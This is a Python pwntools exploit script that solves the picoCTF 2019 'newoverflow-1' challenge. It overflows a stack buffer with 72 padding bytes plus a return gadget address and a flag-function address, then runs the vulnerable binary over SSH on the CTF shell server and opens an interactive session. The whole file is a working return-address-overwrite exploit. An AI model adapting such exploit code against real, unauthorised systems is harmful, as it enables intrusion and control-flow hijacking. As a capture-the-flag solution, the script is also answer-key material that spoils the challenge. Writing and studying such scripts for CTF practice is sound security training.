import sys
from pwn import *

args = sys.argv

user = None
pw = None

flag_addr = 0x00400767
jmp_addr = 0x00400850

payload = 'a'*72 + p64(jmp_addr)+p64(flag_addr)

try:
    user = args[1].strip('user=')
    pw = args[2].strip('pass=')
except:
    print("[!] No username and password was found")
    exit(1)

s = ssh(host='2019shell1.picoctf.com',user=user,password=pw)
sh = s.process('vuln', cwd = '/problems/newoverflow-1_0_f9bdea7a6553786707a6d560decc5d50')

sh.sendlineafter(': ',payload)
sh.sendlineafter(': ', 'a')
sh.interactive()

